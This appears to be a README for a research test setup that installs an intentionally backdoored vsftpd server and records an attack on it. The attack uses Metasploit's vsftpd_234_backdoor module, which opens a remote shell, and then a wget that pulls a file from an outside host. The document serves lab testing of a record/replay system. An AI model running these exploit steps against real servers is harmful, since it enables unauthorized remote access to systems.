!!! WARNING !!!

Executables in this directory is exploitable and for testing purpose ONLY. Please do NOT use them unless you are sure about the security risks.

-----------------------------------------------------------------
Install metasploit client & exploitable-vsftpd
-----------------------------------------------------------------

Install metasploit framework on MacOS client (free but no GUI)

        Download framework at https://www.metasploit.com/download
        Install by following instruction
        After installed, on MacOS, it is located at /opt/metasploit-framework
        All executables are in the bin directory. Rest in the embedded director.

Install missing libraries for exploitable vsftpd on the server:

        sudo apt-get install libcap-dev
        sudo ln /usr/lib/libcap-ng.so.0.0.0 /usr/lib/libcap.so.1
        sudo cp $OMNIPLAY_DIR/exploit/vsftpd.conf /etc (vsftpd config file)
        sudo mkdir /usr/share/empty (vsftpd need it)
        ifconfig (note the ip address used in the attack)

-----------------------------------------------------------------
Record exploitable-vsftpd & attack
-----------------------------------------------------------------

Record exploitable-vsftpd:

        cd $OMNIPLAY_DIR/test
        ./xreset.sh
        ./xrun.sh “/bin/bash” (record the whole shell)
        cd $OMNIPLAY_DIR/exploit
        sudo ./exploitable-vsftpd (start exploitable vsftp server)
        Use metasploit client to attack, see attack section below
        Ctrl + c (end vsftpd)
        exit (end the recording)

Attack & exploit from MacOS client:

        cd /opt/metasploit-framework/bin
        ./msfconsole (start the console, like a shell)
        search platform:unix vsftpd (see a list of things related to unix and vsftpd)
        use exploit/unix/ftp/vsftpd_234_backdoor (load a vsftpd_234 exploit)
        show info (get more details of the exploit)
        show options (see parameters needed for the exploit)
        set RHOST server_ip (set target server for the exploit)
        exploit (execute the exploit)
        This particular exploit will create a remote terminal session.
        Attacker can use any shell command to attack the server:
                wget -O hacked http://www.alanfluo.com/LICENSE.txt
                cp ./hacked ./innocent
                exit (end backdoor session)


